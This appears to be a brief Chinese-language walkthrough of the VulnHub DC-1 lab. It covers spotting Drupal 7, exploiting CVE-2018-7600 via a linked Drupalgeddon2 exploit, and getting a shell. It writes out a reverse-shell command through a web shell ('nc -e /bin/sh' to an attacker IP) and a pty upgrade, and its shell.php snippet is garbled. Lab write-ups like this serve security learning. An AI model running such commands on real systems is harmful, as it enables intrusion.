---
title: "VulnHub-DC1"
date: 2022-03-20
categories: [滲透測試]
tags: [Vulnhub]
ShowToc: true
TocOpen: true
---

# 發現有 port 80 -\> 直接瀏覽網頁

# 使用 wappalyzer 得知使用 Drupal 7

# 搜尋已知 Exploit 來取得 RCE

- CVE-2018-7600

  > Exploit:https://github.com/dreadlocked/Drupalgeddon2

# ls -\> 發現 flag1

# 發現有 shell.php

```line-numbers
&1 ');}>
```

# 使用 nc 監聽取回 reverse shell(python pty)

```line-numbers
http://10.0.2.4/shell.php?c=nc%20-e%20%2Fbin%2Fsh%2010.0.2.15%208080
nc -e /bin/sh 10.0.2.15 8080
python -c "import pty;pty.spawn('/bin/bash')"
```
